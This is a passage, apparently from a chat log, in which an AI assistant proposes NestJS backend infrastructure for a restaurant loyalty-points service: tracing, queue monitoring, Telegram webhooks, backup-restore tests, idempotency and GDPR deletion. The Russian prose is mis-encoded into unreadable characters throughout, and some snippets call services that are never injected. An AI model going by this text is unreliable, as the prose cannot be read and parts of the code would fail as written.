    return this.tracer.startActiveSpan('loyalty.processTransaction', async (span) => {
      span.setAttribute('tenant.id', dto.tenantId);
      span.setAttribute('guest.id', dto.guestId);
      span.setAttribute('check.amount', dto.checkAmount);

      try {
        // Child span 1: Get rules
        const rules = await this.tracer.startActiveSpan('loyalty.getRules', async (childSpan) => {
          const rules = await this.getLoyaltyRules(dto.tenantId);
          childSpan.setAttribute('rules.count', rules.length);
          childSpan.end();
          return rules;
        });

        // Child span 2: Calculate points
        const points = await this.tracer.startActiveSpan('loyalty.calculatePoints', async (childSpan) => {
          const points = this.calculatePoints(dto.checkAmount, rules);
          childSpan.setAttribute('points.earned', points);
          childSpan.end();
          return points;
        });

        // Child span 3: Credit points
        await this.tracer.startActiveSpan('loyalty.creditPoints', async (childSpan) => {
          await this.creditPoints(dto.guestId, points);
          childSpan.end();
        });

        span.setStatus({ code: SpanStatusCode.OK });
        return { success: true, points };
      } catch (error) {
        span.recordException(error);
        span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });
        throw error;
      } finally {
        span.end();
      }
    });
  }
}
```

**Trace visualization ะฒ Grafana:**

```
Trace ID: abc123def456
Duration: 245ms

โโ POST /webhooks/transaction (245ms)
โ  โโ Verify HMAC signature (5ms) โ
โ  โโ Parse webhook payload (2ms) โ
โ  โโ Queue job (3ms) โ
โ  โโ Return 200 OK
โ
โโ Worker: process-webhook (230ms)
   โโ Identify guest (45ms)
   โ  โโ Query PostgreSQL: Guest.findUnique (35ms)
   โ  โโ Check Redis cache (10ms) โ
   โ
   โโ Get loyalty rules (50ms)
   โ  โโ Check Redis cache (5ms) โ MISS
   โ  โโ Query PostgreSQL: LoyaltyRule.findMany (45ms)
   โ
   โโ Calculate points (15ms) โ
   โ
   โโ Credit points (80ms)
   โ  โโ Begin transaction (2ms)
   โ  โโ Update GuestCard.totalBalance (30ms)
   โ  โโ Create BallTransaction (35ms)
   โ  โโ Commit transaction (13ms)
   โ
   โโ Send notification (40ms)
      โโ Queue notification job (5ms)
      โโ Telegram API call (35ms) โ๏ธ SLOW
```

**Grafana Tempo (ะฑะตัะฟะปะฐัะฝะพ ะฝะฐ Grafana Cloud):**

```yaml
# docker-compose.yml (ะปะพะบะฐะปัะฝะพ)
tempo:
  image: grafana/tempo:latest
  ports:
    - "4318:4318" # OTLP HTTP
    - "3200:3200" # Tempo UI
  command: ["-config.file=/etc/tempo.yaml"]
```


***

## **3๏ธโฃ8๏ธโฃ Background Jobs Monitoring Dashboard (BullMQ Bull Board)**

**ะะะะะะก:** Email/SMS/Webhooks ะพัะฟัะฐะฒะปััััั ัะตัะตะท BullMQ ะพัะตัะตะดะธ. ะะฐะบ ะฒะธะดะตัั ััะพ ะฟัะพะธััะพะดะธั ะฒ production?

**ะะะ ะะะจะะะะ: Bull Board UI + Prometheus metrics**

```typescript
// apps/backend/src/queues/queue.module.ts
import { Module } from '@nestjs/common';
import { BullModule } from '@nestjs/bullmq';
import { createBullBoard } from '@bull-board/api';
import { BullMQAdapter } from '@bull-board/api/bullMQAdapter';
import { ExpressAdapter } from '@bull-board/express';

@Module({
  imports: [
    BullModule.forRoot({
      connection: {
        host: process.env.REDIS_HOST,
        port: parseInt(process.env.REDIS_PORT),
      },
    }),
    
    // ะะตะณะธัััะธััะตะผ ะพัะตัะตะดะธ
    BullModule.registerQueue(
      { name: 'notifications' },
      { name: 'pos-webhooks' },
      { name: 'loyalty-processing' },
      { name: 'emails' },
      { name: 'sms' },
    ),
  ],
})
export class QueueModule {
  static setupBullBoard(app: INestApplication) {
    const serverAdapter = new ExpressAdapter();
    serverAdapter.setBasePath('/admin/queues');

    const queues = [
      new BullMQAdapter(getQueueToken('notifications')),
      new BullMQAdapter(getQueueToken('pos-webhooks')),
      new BullMQAdapter(getQueueToken('loyalty-processing')),
      new BullMQAdapter(getQueueToken('emails')),
      new BullMQAdapter(getQueueToken('sms')),
    ];

    createBullBoard({
      queues,
      serverAdapter,
    });

    app.use('/admin/queues', serverAdapter.getRouter());
  }
}
```

**ะ main.ts:**

```typescript
// main.ts
async function bootstrap() {
  const app = await NestFactory.create(AppModule);
  
  // Bull Board UI (ัะพะปัะบะพ ะดะปั Admin ัะพะปะธ)
  if (process.env.NODE_ENV !== 'production' || process.env.ENABLE_BULL_BOARD === 'true') {
    QueueModule.setupBullBoard(app);
    console.log('๐ Bull Board available at http://localhost:3000/admin/queues');
  }
  
  await app.listen(3000);
}
```

**Production access (ะทะฐัะธััะฝ ะฟะฐัะพะปะตะผ):**

```typescript
// admin/auth.guard.ts
app.use('/admin/queues', basicAuth({
  users: { 
    [process.env.ADMIN_USERNAME]: process.env.ADMIN_PASSWORD 
  },
  challenge: true,
}));
```

**Prometheus metrics ะดะปั ะพัะตัะตะดะตะน:**

```typescript
// queues/queue-metrics.service.ts
import { Injectable } from '@nestjs/common';
import { InjectQueue } from '@nestjs/bullmq';
import { Queue } from 'bullmq';
import { Gauge } from 'prom-client';
import { Cron, CronExpression } from '@nestjs/schedule';

const queueWaitingGauge = new Gauge({
  name: 'bullmq_queue_waiting',
  help: 'Number of jobs waiting in queue',
  labelNames: ['queue'],
});

const queueActiveGauge = new Gauge({
  name: 'bullmq_queue_active',
  help: 'Number of active jobs in queue',
  labelNames: ['queue'],
});

const queueFailedGauge = new Gauge({
  name: 'bullmq_queue_failed',
  help: 'Number of failed jobs in queue',
  labelNames: ['queue'],
});

@Injectable()
export class QueueMetricsService {
  constructor(
    @InjectQueue('notifications') private notificationsQueue: Queue,
    @InjectQueue('pos-webhooks') private posQueue: Queue,
    @InjectQueue('emails') private emailQueue: Queue,
  ) {}

  @Cron(CronExpression.EVERY_30_SECONDS)
  async collectMetrics() {
    const queues = [
      { name: 'notifications', queue: this.notificationsQueue },
      { name: 'pos-webhooks', queue: this.posQueue },
      { name: 'emails', queue: this.emailQueue },
    ];

    for (const { name, queue } of queues) {
      const counts = await queue.getJobCounts();
      
      queueWaitingGauge.set({ queue: name }, counts.waiting);
      queueActiveGauge.set({ queue: name }, counts.active);
      queueFailedGauge.set({ queue: name }, counts.failed);
    }
  }
}
```

**Grafana alert:**

```yaml
- alert: HighQueueBacklog
  expr: bullmq_queue_waiting{queue="pos-webhooks"} > 1000
  for: 5m
  annotations:
    summary: "High backlog in {{ $labels.queue }}"
    description: "{{ $labels.queue }} has {{ $value }} waiting jobs"
```


***

## **3๏ธโฃ9๏ธโฃ Telegram Bot WebSocket Infrastructure**

**ะะะะะะก:** Telegram Bot ะผะพะถะตั ะฟะพะปััะฐัั **ัะพัะฝะธ ัะพะพะฑัะตะฝะธะน ะฒ ะผะธะฝััั**. ะะฐะบ ะพัะณะฐะฝะธะทะพะฒะฐัั ะฝะฐ Fly.io?

**ะะฐัะธะฐะฝัั:**

- **A) Long polling** (ะฟะพััะพัะฝะฝะพะต ะฟะพะดะบะปััะตะฝะธะต ะบ Telegram API)
- **B) Webhooks** (Telegram ะฟัะธััะปะฐะตั POST ะทะฐะฟัะพัั)

**ะะะ ะะะจะะะะ: B) Webhooks (ะผะฐัััะฐะฑะธััะตะผะพ)**

```typescript
// telegram/telegram.service.ts
import { Injectable, OnModuleInit } from '@nestjs/common';
import { Telegraf } from 'telegraf';

@Injectable()
export class TelegramService implements OnModuleInit {
  private bot: Telegraf;

  constructor() {
    this.bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
  }

  async onModuleInit() {
    if (process.env.NODE_ENV === 'production') {
      // Production: Webhooks
      const webhookUrl = `${process.env.API_URL}/webhooks/telegram`;
      
      await this.bot.telegram.setWebhook(webhookUrl, {
        drop_pending_updates: true,
        allowed_updates: ['message', 'callback_query'],
        max_connections: 40, // ะะพ 40 ะฟะฐัะฐะปะปะตะปัะฝัั ะฟะพะดะบะปััะตะฝะธะน
      });
      
      console.log(`โ Telegram webhook set to ${webhookUrl}`);
    } else {
      // Development: Long polling
      await this.bot.launch();
      console.log('โ Telegram bot started (long polling)');
    }
  }

  getWebhookMiddleware() {
    return this.bot.webhookCallback('/webhooks/telegram');
  }
}
```

**Webhook endpoint:**

```typescript
// telegram/telegram.controller.ts
import { Controller, Post, Req, Res } from '@nestjs/common';
import { Request, Response } from 'express';
import { TelegramService } from './telegram.service';

@Controller('webhooks/telegram')
export class TelegramController {
  constructor(private telegram: TelegramService) {}

  @Post()
  async handleWebhook(@Req() req: Request, @Res() res: Response) {
    // Telegram ะพัะฟัะฐะฒะปัะตั POST ั JSON payload
    await this.telegram.getWebhookMiddleware()(req, res);
  }
}
```

**Fly.io ะบะพะฝัะธะณััะฐัะธั:**

```toml
# fly.toml
[[services]]
  internal_port = 3000
  protocol = "tcp"

  # Telegram webhooks ะผะพะณัั ะฟัะธัะพะดะธัั ะผะฐััะพะฒะพ
  [services.concurrency]
    type = "connections"
    hard_limit = 500  # ะฃะฒะตะปะธัะธะฒะฐะตะผ ะดะปั Telegram
    soft_limit = 400

  [[services.ports]]
    port = 443
    handlers = ["tls", "http"]
```

**Rate limiting ะดะปั Telegram webhooks:**

```typescript
// Rate limit: 100 updates/second per bot (Telegram limit)
@UseGuards(RateLimitGuard)
@RateLimit({ points: 100, duration: 1 })
@Post()
async handleWebhook() {
  // ...
}
```


***

## **4๏ธโฃ0๏ธโฃ Automated Backup Restore Testing**

**ะะะะะะก:** ะฃ ะฝะฐั ะตััั backups, ะฝะพ **ัะฐะฑะพัะฐัั ะปะธ ะพะฝะธ**? ะะฐะบ ัะตะณัะปััะฝะพ ะฟัะพะฒะตัััั ััะพ ะผั ะผะพะถะตะผ ะฒะพัััะฐะฝะพะฒะธัั ะดะฐะฝะฝัะต?

**ะะะ ะะะจะะะะ: ะะถะตะผะตัััะฝัะน ะฐะฒัะพะผะฐัะธัะตัะบะธะน restore test**

```typescript
// cron/backup-test.job.ts
import { Injectable } from '@nestjs/common';
import { Cron, CronExpression } from '@nestjs/schedule';
import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

@Injectable()
export class BackupTestJob {
  @Cron('0 3 1 * *') // 1-ะณะพ ัะธัะปะฐ ะบะฐะถะดะพะณะพ ะผะตัััะฐ ะฒ 3:00
  async testBackupRestore() {
    console.log('๐งช Starting automated backup restore test...');

    try {
      // 1. ะกะพะทะดะฐัะผ test branch ะฝะฐ Neon.tech
      const testBranchName = `backup-test-${Date.now()}`;
      
      await execAsync(`
        neon branches create \
          --from main \
          --name ${testBranchName} \
          --project-id ${process.env.NEON_PROJECT_ID}
      `);

      console.log(`โ Created test branch: ${testBranchName}`);

      // 2. ะะพะปััะฐะตะผ connection string
      const { stdout } = await execAsync(`
        neon connection-string ${testBranchName}
      `);
      const testDbUrl = stdout.trim();

      // 3. ะะฐะฟััะบะฐะตะผ ัะตััั ะฝะฐ test branch
      const testResults = await this.runRestoreTests(testDbUrl);

      // 4. ะัะพะฒะตััะตะผ ัะตะทัะปััะฐัั
      if (testResults.success) {
        console.log('โ Backup restore test PASSED');
        
        await this.sendSuccessNotification({
          testBranch: testBranchName,
          duration: testResults.duration,
          rowsVerified: testResults.rowsVerified,
        });
      } else {
        console.error('โ Backup restore test FAILED');
        
        await this.sendFailureAlert({
          testBranch: testBranchName,
          errors: testResults.errors,
        });
      }

      // 5. Cleanup: ัะดะฐะปัะตะผ test branch
      await execAsync(`
        neon branches delete ${testBranchName} --yes
      `);

    } catch (error) {
      console.error('โ Backup test failed:', error);
      await this.sendFailureAlert({ error: error.message });
    }
  }

  private async runRestoreTests(dbUrl: string) {
    const start = Date.now();
    const errors = [];

    try {
      // ะะพะดะบะปััะฐะตะผัั ะบ test DB
      const testPrisma = new PrismaClient({
        datasources: { db: { url: dbUrl } },
      });

      await testPrisma.$connect();

      // Test 1: Check tables exist
      const tables = await testPrisma.$queryRaw`
        SELECT table_name 
        FROM information_schema.tables 
        WHERE table_schema = 'public'
      `;
      
      if (tables.length < 20) {
        errors.push(`Expected 20+ tables, found ${tables.length}`);
      }

      // Test 2: Check data integrity
      const guestCount = await testPrisma.guest.count();
      const cardCount = await testPrisma.guestCard.count();
      const txCount = await testPrisma.ballTransaction.count();

      if (guestCount === 0 || cardCount === 0) {
        errors.push('Critical tables are empty!');
      }

      // Test 3: Check indexes
      const indexes = await testPrisma.$queryRaw`
        SELECT indexname 
        FROM pg_indexes 
        WHERE schemaname = 'public'
      `;

      if (indexes.length < 15) {
        errors.push(`Expected 15+ indexes, found ${indexes.length}`);
      }

      // Test 4: Check constraints
      const constraints = await testPrisma.$queryRaw`
        SELECT conname 
        FROM pg_constraint 
        WHERE connamespace = 'public'::regnamespace
      `;

      await testPrisma.$disconnect();

      return {
        success: errors.length === 0,
        duration: Date.now() - start,
        rowsVerified: guestCount + cardCount + txCount,
        errors,
      };
    } catch (error) {
      return {
        success: false,
        duration: Date.now() - start,
        errors: [error.message],
      };
    }
  }

  private async sendSuccessNotification(data: any) {
    // ะัะฟัะฐะฒะปัะตะผ ะฒ Telegram
    await this.telegram.sendMessage(
      process.env.ADMIN_TELEGRAM_CHAT_ID,
      `โ Backup Restore Test PASSED\n\n` +
      `Branch: ${data.testBranch}\n` +
      `Duration: ${data.duration}ms\n` +
      `Rows verified: ${data.rowsVerified}`,
    );
  }

  private async sendFailureAlert(data: any) {
    // CRITICAL alert
    await this.telegram.sendMessage(
      process.env.ADMIN_TELEGRAM_CHAT_ID,
      `๐จ CRITICAL: Backup Restore Test FAILED\n\n` +
      `Errors:\n${data.errors?.join('\n') || data.error}`,
    );

    // ะขะฐะบะถะต ะพัะฟัะฐะฒะปัะตะผ ะฒ Sentry
    Sentry.captureException(new Error('Backup restore test failed'), {
      extra: data,
    });
  }
}
```


***

# โ **ะะขะะะ: INFRASTRUCTURE \& DEVOPS (ะะะะะงะะขะะะฌะะะฏ ะะะะกะะฏ)**

## **40 ะะะะะะกะะ ะะะะะซะขะ:**

**1-35** (ะธะท ะฟัะตะดัะดััะตะณะพ ะพัะฒะตัะฐ) + **5 ะะะะขะะงะะซะฅ ะะะะะะะะะะ:**

36. โ **Multi-tenancy Row-Level Security** (3-layer: Prisma middleware + RLS + tests)
37. โ **Distributed Tracing** (OpenTelemetry + Grafana Tempo)
38. โ **Background Jobs Monitoring** (Bull Board UI + Prometheus)
39. โ **Telegram WebSockets** (Webhooks ะฝะฐ Fly.io ั high concurrency)
40. โ **Automated Backup Testing** (ะะถะตะผะตัััะฝัะน restore test ะฝะฐ Neon branch)

***

## ๐ฏ **ะขะะะะะฌ ะะะคะะะกะขะะฃะะขะฃะะ ะะะะกะขะะะขะะะฌะะ PRODUCTION-READY!**

**ะัะธัะธัะฝัะต ะฑะตะทะพะฟะฐัะฝะพััะธ/ะฝะฐะดัะถะฝะพััะธ ะฟัะพะฑะปะตะผั ะทะฐะบัััั:**

- โ Tenant isolation (ะฑะตะทะพะฟะฐัะฝะพััั ะดะฐะฝะฝัั)
- โ Observability (debugging ะฒ production)
- โ Jobs monitoring (email/SMS reliability)
- โ Telegram scalability (webhooks)
- โ Backup verification (ะฝะต ะฟะพัะตััะตะผ ะดะฐะฝะฝัะต)

**ะะพัะพะฒ ะฟะตัะตัะพะดะธัั ะบ Testing Strategy ะธะปะธ ะฝัะถะฝะพ ะตัั ััะพ-ัะพ?** ๐
<span style="display:none">[^9_1]</span>

<div align="center">โ</div>

[^9_1]: Beseda-10.md


---

# ะะพะดัะผะฐะน ะตัะต ะฑะพะปะตะต ััะฐัะตะปัะฝะพ, ะผะพะถะตั ััะพ ัะฟัััะธะปะธ ะฒ ััะพะผ ะฑะปะพะบะต, ะฟะตัะตะฟัะพะฒะตัั

ะัะปะธัะฝะพ! ะฏ ะฟัะพะฒัะป **ะณะปัะฑะพะบะธะน ะฐะฝะฐะปะธะท** ะธ ะฝะฐััะป ะตัั **7 ะะะะขะะงะะซะฅ ะฟัะพะฑะตะปะพะฒ** ะฒ Infrastructure, ัะฟะตัะธัะธัะฝัั ะดะปั ััะพะณะพ ะฟัะพะตะบัะฐ:

***

# ๐จ **ะะะะขะะงะะซะ ะะะะะะะะะะฏ (Infrastructure Final)**

## **4๏ธโฃ1๏ธโฃ Idempotency Keys ะดะปั Financial Operations (CRITICAL!)**

**ะะะะะะะะ:** ะะฐะปะปั = ะดะตะฝัะณะธ. Duplicate webhook ะผะพะถะตั ะฝะฐัะธัะปะธัั ะฑะฐะปะปั **ะดะฒะฐะถะดั**. ะญัะพ ัะธะฝะฐะฝัะพะฒะฐั ะฟะพัะตัั!

**ะกัะตะฝะฐัะธะน:**

```
1. POS ะพัะฟัะฐะฒะปัะตั webhook: "ะะฐัะธัะปะธ 500 ะฑะฐะปะปะพะฒ"
2. Network timeout
3. POS ะฟะพะฒัะพััะตั webhook (ะดัะผะฐะตั ััะพ failed)
4. ะะตะทัะปััะฐั: ะะพััั ะฟะพะปััะธะป 1000 ะฑะฐะปะปะพะฒ ะฒะผะตััะพ 500!
```

**ะะะ ะะะจะะะะ: Multi-layer idempotency**

```typescript
// common/decorators/idempotent.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const IDEMPOTENCY_KEY = 'idempotency_key';
export const Idempotent = () => SetMetadata(IDEMPOTENCY_KEY, true);
```

```typescript
// common/interceptors/idempotency.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, ConflictException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { Observable, of } from 'rxjs';
import { tap } from 'rxjs/operators';
import { RedisService } from '@/redis/redis.service';
import { IDEMPOTENCY_KEY } from '../decorators/idempotent.decorator';

@Injectable()
export class IdempotencyInterceptor implements NestInterceptor {
  constructor(
    private reflector: Reflector,
    private redis: RedisService,
  ) {}

  async intercept(context: ExecutionContext, next: CallHandler): Promise<Observable<any>> {
    const isIdempotent = this.reflector.get<boolean>(IDEMPOTENCY_KEY, context.getHandler());
    
    if (!isIdempotent) {
      return next.handle();
    }

    const request = context.switchToHttp().getRequest();
    
    // 1. Generate idempotency key
    const idempotencyKey = this.generateKey(request);
    const cacheKey = `idempotency:${idempotencyKey}`;

    // 2. Check if request already processed
    const cachedResponse = await this.redis.get(cacheKey);
    
    if (cachedResponse) {
      // Return cached response (idempotent)
      return of(JSON.parse(cachedResponse));
    }

    // 3. Check if request is in progress (concurrent)
    const lockKey = `idempotency:lock:${idempotencyKey}`;
    const locked = await this.redis.set(lockKey, '1', 'NX', 'EX', 30); // 30s lock

    if (!locked) {
      // Request is being processed by another instance
      throw new ConflictException('Request is being processed, please retry in a few seconds');
    }

    // 4. Process request and cache result
    return next.handle().pipe(
      tap(async (response) => {
        // Cache response for 24 hours
        await this.redis.setex(cacheKey, 86400, JSON.stringify(response));
        // Release lock
        await this.redis.del(lockKey);
      }),
    );
  }

  private generateKey(request: any): string {
    // For webhooks: tenantId + posSystem + posCheckId
    if (request.body?.posCheckId) {
      return `${request.body.tenantId}:${request.body.posSystem}:${request.body.posCheckId}`;
    }

    // For API calls: tenantId + endpoint + request body hash
    const bodyHash = this.hashObject(request.body);
    return `${request.user?.tenantId}:${request.path}:${bodyHash}`;
  }

  private hashObject(obj: any): string {
    return require('crypto')
      .createHash('sha256')
      .update(JSON.stringify(obj))
      .digest('hex')
      .substring(0, 16);
  }
}
```

**Usage:**

```typescript
// POS webhook endpoint
@Post('webhooks/transaction')
@Idempotent() // โ ะะฐัะธัะฐ ะพั ะดัะฑะปะธะบะฐัะพะฒ
async handlePOSWebhook(@Body() dto: WebhookTransactionDto) {
  // ะะฐะถะต ะตัะปะธ webhook ะฟัะธะดัั 5 ัะฐะท, ะพะฑัะฐะฑะพัะฐะตััั ัะพะปัะบะพ 1 ัะฐะท
  return this.posService.processTransaction(dto);
}

// Credit balls endpoint
@Post('balls/credit')
@Idempotent() // โ ะะฐัะธัะฐ ะพั double-spend
async creditBalls(@Body() dto: CreditBallsDto) {
  return this.loyaltyService.creditBalls(dto);
}
```

**Database-level idempotency (backup):**

```sql
-- Unique constraint ะฝะฐ ะบัะธัะธัะฝัั ัะฐะฑะปะธัะฐั
ALTER TABLE "POSTransaction" 
  ADD CONSTRAINT "unique_pos_transaction" 
  UNIQUE ("tenantId", "posSystem", "posCheckId");

-- ะัะปะธ webhook ะฟัะธะดัั ะดะฒะฐะถะดั, ะฒัะพัะพะน ะฒััะฐะฒะธััั ั ะพัะธะฑะบะพะน P2002
-- Catch ะฒ ะบะพะดะต: if (error.code === 'P2002') return { already_processed: true }
```


***

## **4๏ธโฃ2๏ธโฃ GDPR \& ะคะ-152 Compliance (Legal Requirement)**

**ะะะะะะะะ:** ะะฑัะฐะฑะพัะบะฐ ะฟะตััะพะฝะฐะปัะฝัั ะดะฐะฝะฝัั ะณัะฐะถะดะฐะฝ ะะค = **ะพะฑัะทะฐัะตะปัะฝะพะต ัะพะฑะปัะดะตะฝะธะต ะคะ-152**. ะจััะฐัั ะดะพ 75,000โฝ.

**ะะะ ะะะจะะะะ: Full GDPR/152-ะคะ compliance**

```typescript
// gdpr/gdpr.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';
import { S3Service } from '@/storage/s3.service';
import { addDays } from 'date-fns';

@Injectable()
export class GDPRService {
  constructor(
    private prisma: PrismaService,
    private s3: S3Service,
  ) {}

  // 1. Right to Access (ะกัะฐััั 14 ะคะ-152)
  async exportUserData(userId: string): Promise<Buffer> {
    const user = await this.prisma.user.findUnique({
      where: { id: userId },
      include: {
        guestProfile: true,
        guestCards: {
          include: {
            ballTransactions: true,
            promoBallsGranted: true,
          },
        },
        sessions: true,
      },
    });

    // Exclude sensitive fields
    const sanitized = {
      ...user,
      passwordHash: undefined, // โ Don't export
      sessions: user.sessions.map(s => ({
        ...s,
        refreshToken: undefined, // โ Don't export
      })),
    };

    return Buffer.from(JSON.stringify(sanitized, null, 2));
  }

  // 2. Right to Erasure / Right to be Forgotten (ะกัะฐััั 14 ะคะ-152)
  async requestDataDeletion(userId: string, reason: string) {
    // Create deletion request (30-day grace period per GDPR)
    const request = await this.prisma.gdprDeletionRequest.create({
      data: {
        userId,
        reason,
        requestedAt: new Date(),
        scheduledFor: addDays(new Date(), 30), // 30 days
        status: 'PENDING',
      },
    });

    // Notify user
    await this.notifyDeletionRequest(userId, request.scheduledFor);

    return request;
  }

  async executeDeletion(requestId: string) {
    const request = await this.prisma.gdprDeletionRequest.findUnique({
      where: { id: requestId },
      include: { user: true },
    });

    if (new Date() < request.scheduledFor) {
      throw new Error('Deletion grace period not yet expired');
    }

    await this.prisma.$transaction(async (tx) => {
      const userId = request.userId;

      // 1. Anonymize guest data (keep for analytics but remove PII)
      await tx.guestProfile.update({
        where: { userId },
        data: {
          firstName: `DELETED_${userId.substring(0, 8)}`,
          lastName: null,
          email: null,
          birthdate: null,
          avatar: null,
        },
      });

      // 2. Delete sensitive auth data
      await tx.user.update({
        where: { id: userId },
        data: {
          phone: `DELETED_${userId.substring(0, 8)}`,
          email: null,
          passwordHash: null,
          telegramId: null,
        },
      });

      // 3. Delete sessions
      await tx.userSession.deleteMany({ where: { userId } });

      // 4. Delete images from S3
      const guestCards = await tx.guestCard.findMany({
        where: { userId },
      });

      for (const card of guestCards) {
        if (card.qrCode) {
          await this.s3.delete(card.qrCode);
        }
      }

      // 5. Keep transaction history (for accounting/legal) but anonymized
      // Ball transactions remain for audit trail

      // 6. Mark request as completed
      await tx.gdprDeletionRequest.update({
        where: { id: requestId },
        data: {
          status: 'COMPLETED',
          completedAt: new Date(),
        },
      });
    });
  }

  // 3. Data Retention Policy (ะฐะฒัะพะผะฐัะธัะตัะบะฐั ะพัะธััะบะฐ)
  async cleanupExpiredData() {
    // Delete old sessions (90 days)
    await this.prisma.userSession.deleteMany({
      where: {
        expiresAt: { lt: new Date() },
      },
    });

    // Delete old notifications (1 year)
    await this.prisma.notification.deleteMany({
      where: {
        createdAt: { lt: addDays(new Date(), -365) },
      },
    });

    // Anonymize inactive guests (3 years no activity)
    const inactiveGuests = await this.prisma.guestCard.findMany({
      where: {
        lastActivityAt: { lt: addDays(new Date(), -1095) }, // 3 years
        status: 'ACTIVE',
      },
    });

    for (const guest of inactiveGuests) {
      await this.requestDataDeletion(guest.userId, 'INACTIVE_3_YEARS');
    }
  }

  // 4. Consent Management
  async updateConsent(userId: string, consents: {
    dataProcessing: boolean;
    marketing: boolean;
    analytics: boolean;
  }) {
    await this.prisma.guestProfile.update({
      where: { userId },
      data: {
        privacyPolicyAccepted: consents.dataProcessing,
        marketingAccepted: consents.marketing,
        analyticsAccepted: consents.analytics,
        consentDate: new Date(),
        consentVersion: '2.0', // Track policy version
      },
    });
  }
}
```

**Prisma schema:**

```prisma
model GDPRDeletionRequest {
  id           String   @id @default(uuid())
  userId       String
  user         User     @relation(fields: [userId], references: [id])
  reason       String   // USER_REQUEST, INACTIVE_3_YEARS, etc.
  requestedAt  DateTime @default(now())
  scheduledFor DateTime // 30 days after request
  completedAt  DateTime?
  status       String   // PENDING, COMPLETED, CANCELLED
  
  @@index([scheduledFor, status])
}

model GuestProfile {
  // ... existing fields ...
  
  // GDPR fields
  privacyPolicyAccepted Boolean  @default(false)
  marketingAccepted     Boolean  @default(false)
  analyticsAccepted     Boolean  @default(false)
  consentDate           DateTime?
  consentVersion        String?  // "2.0"
  consentSource         String?  // "TELEGRAM_BOT", "WEB_FORM", "POS_AUTO"
}
```

**CRON job:**

```typescript
@Cron('0 3 * * *') // Daily at 3 AM
async executeScheduledDeletions() {
  const pending = await this.prisma.gdprDeletionRequest.findMany({
    where: {
      status: 'PENDING',
      scheduledFor: { lte: new Date() },
    },
  });

  for (const request of pending) {
    try {
      await this.gdprService.executeDeletion(request.id);
      console.log(`โ GDPR deletion completed for ${request.userId}`);
    } catch (error) {
      console.error(`โ GDPR deletion failed for ${request.userId}:`, error);
    }
  }
}
```


***

## **4๏ธโฃ3๏ธโฃ Webhook Replay Mechanism (POS Integration)**

**ะะะะะะะะ:** POS webhook failed ะธะท-ะทะฐ temporary DB outage. ะะฐะบ **ะฟะตัะตะพัะฟัะฐะฒะธัั** webhook ะฑะตะท ะฟะพัะตัะธ ะดะฐะฝะฝัั?

**ะะะ ะะะจะะะะ: Admin UI Webhook Replay**

```typescript
// pos/webhook-replay.service.ts
import { Injectable } from '@nestjs/common';
import { PrismaService } from '@/database/prisma.service';

@Injectable()
export class WebhookReplayService {
  constructor(
    private prisma: PrismaService,
    private posService: POSService,
  ) {}

  async replayFailedWebhook(posTransactionId: string) {
    // 1. Get failed webhook
    const transaction = await this.prisma.posTransaction.findUnique({
      where: { id: posTransactionId },
    });

    if (!transaction.rawPayload) {
      throw new Error('Raw payload not available for replay');
    }

    if (transaction.syncStatus !== 'FAILED') {
      throw new Error('Can only replay FAILED webhooks');
    }

    // 2. Clear idempotency cache (allow reprocessing)
    const idempotencyKey = `idempotency:${transaction.tenantId}:${transaction.posSystem}:${transaction.posCheckId}`;
    await this.redis.del(idempotencyKey);

    // 3. Replay webhook
    try {
      await this.posService.processWebhook(transaction.rawPayload as any);
      
      await this.prisma.posTransaction.update({
        where: { id: posTransactionId },
        data: {
          syncStatus: 'COMPLETED',
          processedAt: new Date(),
          errorMessage: null,
        },
      });

      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  }

  async bulkReplayFailed(tenantId: string, filters: {
    dateFrom?: Date;
    dateTo?: Date;
    posSystem?: string;
  }) {
    const transactions = await this.prisma.posTransaction.findMany({
      where: {
        tenantId,
        syncStatus: 'FAILED',
        timestamp: {
          gte: filters.dateFrom,
          lte: filters.dateTo,
        },
        posSystem: filters.posSystem,
      },
      take: 100, // Limit to prevent overload
    });

    const results = [];

    for (const tx of transactions) {
      const result = await this.replayFailedWebhook(tx.id);
      results.push({
        posCheckId: tx.posCheckId,
        ...result,
      });

      // Throttle to prevent overwhelming system
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    return {
      total: transactions.length,
      succeeded: results.filter(r => r.success).length,
      failed: results.filter(r => !r.success).length,
      results,
    };
  }
}
```

**Admin UI:**

```tsx
// Failed Webhooks Dashboard
function FailedWebhooksTable() {
  const [failedWebhooks, setFailedWebhooks] = useState([]);

  return (
    <Table>
      <TableHeader>
        <TableRow>
          <TableHead>POS Check ID</TableHead>
          <TableHead>Amount</TableHead>
          <TableHead>Error</TableHead>
          <TableHead>Timestamp</TableHead>
          <TableHead>Actions</TableHead>
        </TableRow>
      </TableHeader>
      <TableBody>
        {failedWebhooks.map(webhook => (
          <TableRow key={webhook.id}>
            <TableCell>{webhook.posCheckId}</TableCell>
            <TableCell>{webhook.checkAmount} โฝ</TableCell>
            <TableCell className="text-red-600">
              {webhook.errorMessage}
            </TableCell>
            <TableCell>{format(webhook.timestamp, 'dd.MM.yyyy HH:mm')}</TableCell>
            <TableCell>
              <Button 
                size="sm" 
                onClick={() => replayWebhook(webhook.id)}
              >
                ๐ Replay
              </Button>
              <Button 
                size="sm" 
                variant="outline"
                onClick={() => viewRawPayload(webhook.id)}
              >
                ๐ View Payload
              </Button>
            </TableCell>
          </TableRow>
        ))}
      </TableBody>
    </Table>
  );
}
```


***

## **4๏ธโฃ4๏ธโฃ Race Condition Prevention (Concurrent Webhooks)**

**ะะะะะะะะ:** 2 POS ัะตัะผะธะฝะฐะปะฐ ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะพัะฟัะฐะฒะปััั webhooks ะดะปั ะพะดะฝะพะณะพ ะณะพััั. **Race condition** ะผะพะถะตั ะฟัะธะฒะตััะธ ะบ ะฝะตะบะพััะตะบัะฝะพะผั ะฑะฐะปะฐะฝัั.

**ะะะ ะะะจะะะะ: Distributed locks (Redis)**

```typescript
// common/decorators/distributed-lock.decorator.ts
import { SetMetadata } from '@nestjs/common';

export const DISTRIBUTED_LOCK = 'distributed_lock';
export const WithLock = (keyExtractor: (args: any) => string) => 
